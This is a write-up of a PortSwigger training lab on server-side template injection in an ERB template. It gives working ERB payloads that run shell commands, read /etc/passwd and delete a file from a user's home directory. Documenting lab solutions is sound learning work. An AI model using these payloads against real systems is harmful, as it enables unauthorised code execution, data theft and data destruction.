🔖 Challenge Info

    Challenge Name: Basic Server-Side Template Injection

    Category: Web Exploitation

    CTF Platform: PortSwigger

    Date Solved: 2025-05-05

📜 Challenge Description

    This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB      template.
    To solve the lab, review the ERB documentation to learn how to execute arbitrary Ruby code, then       delete the morale.txt file from Carlos's home directory.

🔍 Recon & Exploitation Steps

    🔹 Understanding the Syntax
        I began by researching ERB (Embedded Ruby) syntax and how it processes template code. From the         documentation, I learned:

            <%= ... %> evaluates Ruby code and outputs the result.

            <% ... %> evaluates the code silently (no output).

        This is important when testing for SSTI.
    🔹 Finding Injection Points

    I visited the lab's web application and clicked on a product. The URL looked like this:

        https://0a21007604d9d4ffaa4126020086007f.web-security-academy.net/product?productId=2

    I tried injecting ERB syntax directly into the URL, such as:

        <%= 7 * 7 %>

    However, nothing happened — no code execution or errors were visible.
    🔹 Deeper Testing Using Burp Suite

        I used Burp Suite to inspect traffic between the browser and the server:

        Browsed the site normally while Burp was capturing traffic.

        Reviewed the HTTP history for interesting parameters.

        Found a request that contained a message field displaying:
        "Unfortunately this product is out of stock."

        This message hinted at dynamic rendering, so I sent the request to Burp Repeater for testing.
    🔹 Successful Injection

    Inside Burp Repeater, I modified the message parameter:

        Test: <%= 7 * 7 %>
        ✅ Response returned 49, confirming SSTI vulnerability.

        Test: <%= system("whoami") %>
        ✅ Returned the current user name.

        Test: <%= system("ls") %>
        ✅ Listed files, including morale.txt.

        Test: <%= system("rm morale.txt") %>
        ❌ Did not delete the file.

        Test: <%= system("pwd") %>
        ✅ Returned /home/carlos.

        Test: <%= system("rm /home/carlos/morale.txt") %>
        ❌ Still did not delete the file.

    🔹 Reading and Deleting the File with Ruby Functions

        Since system("rm ...") wasn’t working, I switched to Ruby-native functions:

        Test: <%= File.read("/etc/passwd") %>
        ✅ Successfully read the file — confirmed file access via Ruby.

        Final Payload: <%= File.delete("morale.txt") %>
        ✅ Success! File deleted. Lab marked as solved.

🏁 Flag

    (No flag was provided — solving the lab by deleting the file completes the challenge.)
